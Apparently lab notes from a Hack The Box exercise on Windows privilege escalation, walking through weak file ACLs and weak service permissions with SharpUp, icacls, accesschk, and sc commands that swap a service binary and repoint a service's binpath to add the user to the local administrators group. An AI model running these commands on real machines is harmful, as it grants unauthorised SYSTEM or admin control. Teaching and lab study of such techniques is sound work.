 Permissive File System ACLs

We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```
PS C:\tools> .\sharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"


=== AlwaysInstallElevated Registry Keys ===



=== Modifiable Folders in %PATH% ===



=== Modifiable Registry Autoruns ===



=== *Special* User Privileges ===



=== Unattended Install Files ===



=== McAfee Sitelist.xml Files ===



=== Cached GPP Password ===

  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.


[*] Completed Privesc Checks in 1 seconds

PS C:\tools>

```

Checking Permissions with icacls

```

PS C:\tools> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

#### Replacing Service Binary

This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`. It can give us a reverse shell as `SYSTEM`, or add a local admin user and give us full administrative control over the machine.

```
        cmd
`C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe" C:\htb> sc start SecurityService`
```

 
 **Weak Service Permissions**

run sharpup.

```
C:\htb> SharpUp.exe audit === SharpUp: Running Privilege Escalation Checks === === Modifiable Services === Name : WindscribeService DisplayName : WindscribeService Description : Manages the firewall and controls the VPN tunnel State : Running StartMode : Auto PathName : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

Checking Permissions with AccessChk

```
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService Accesschk v6.13 - Reports effective permissions for securable objects Copyright ⌐ 2006-2020 Mark Russinovich Sysinternals - www.sysinternals.com WindscribeService Medium Mandatory Level (Default) [No-Write-Up] RW NT AUTHORITY\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\Authenticated Users SERVICE_ALL_ACCESS
```

#### heck Local Admin Group

Checking the local administrators group confirms that our user `htb-student` is not a member.

```
        cmd
`C:\htb> net localgroup administrators Alias name     administrators Comment        Administrators have complete and unrestricted access to the computer/domain   Members   ------------------------------------------------------------------------------- Administrator mrb3n The command completed successfully.`
```

#### Changing the Service Binary Path

We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).

```
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add" [SC] ChangeServiceConfig SUCCESS
```
```
C:\htb> sc stop WindscribeService

C:\htb> sc start WindscribeService


C:\htb> net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator htb-student mrb3n The command completed successfully.


```

now open powershell as administrator and change to htb-student and enter the password now you will be able to read the flag.